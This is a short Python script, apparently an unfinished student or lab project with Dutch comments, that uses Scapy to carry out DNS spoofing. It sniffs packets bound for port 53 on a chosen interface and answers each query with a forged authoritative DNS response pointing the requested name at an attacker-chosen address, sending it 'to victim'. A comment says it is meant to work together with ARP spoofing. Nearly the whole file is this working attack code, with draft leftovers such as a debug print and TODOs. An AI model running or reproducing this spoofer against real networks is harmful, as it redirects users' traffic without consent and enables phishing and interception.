from scapy.all import *
# import scanning as scan
from sys import argv
import socket

# DNS spoofing will make use of ARP spoofing
#from scapy.layers.dns import DNSQR, UDP, DNS, DNSRR
#from scapy.layers.inet import IP, TCP

""" kan in een losse functie gezet worden, maar eerst kijken of het zo werkt
def alter_packet(d_pkt):
    #als dit niet werkt zet hier [0] achter
    dstIP = d_pkt.getlayer(IP).dst
    srcIP = d_pkt.getlayer(IP).src
    dstPort =
    srcPort =
    new_pkt = "voeg iets samen"
    return new_pkt
"""

def dns_spoof(interface):
    # sniff DNS traffic one at a time
    # , iface=argv[1]
    print("hoi2")
    while 1:
        DNSpkt = scapy.all.sniff(iface =interface, count=1, filter="dst port 53")
        # if it is a DNS request, start with creating response DNSpkt[0].haslayer(scapy.all.DNSQR):
        if 1:
            # ignore this: alter_packet(DNSpkt)
            dstIP = DNSpkt[0].getlayer(scapy.all.IP).dst
            srcIP = DNSpkt[0].getlayer(scapy.all.IP).src

            # check if it is UDP or TCP traffic
            if DNSpkt[0].haslayer(scapy.all.UDP):
                dstPort = DNSpkt[0].getlayer(scapy.all.UDP).dport
                srcPort = DNSpkt[0].getlayer(scapy.all.UDP).sport
            elif DNSpkt[0].haslayer(scapy.all.TCP):
                dstPort = DNSpkt[0].getlayer(scapy.all.TCP).dport
                srcPort = DNSpkt[0].getlayer(scapy.all.TCP).sport

            dnsId = DNSpkt[0].getlayer(scapy.all.DNS).id
            dnsQd = DNSpkt[0].getlayer(scapy.all.DNS).qd

            # retrieve the name of the website that is searched for
            queryName = DNSpkt[0].getlayer(scapy.all.DNS).qd.qname

            # TODO: create website and fill IP address in below
            # my_site = '192.168.56.101'
            my_site = DNSpkt[0].getlayer(scapy.all.IP).src
            # create DNS response packet in the form of IP()/UDP()/DNS()

            spoof_response = scapy.all.IP(dst=srcIP, src=dstIP)/\
                             scapy.all.UDP(dport=srcPort, sport=dstPort)/\
                             scapy.all.DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=scapy.all.DNSRR(rrname=queryName, ttl=20, rdata=my_site))

            # send packet to victim
            print(spoof_response)
            scapy.all.send(spoof_response)
        # elif: exit??


"""def return_packet():
  
"""























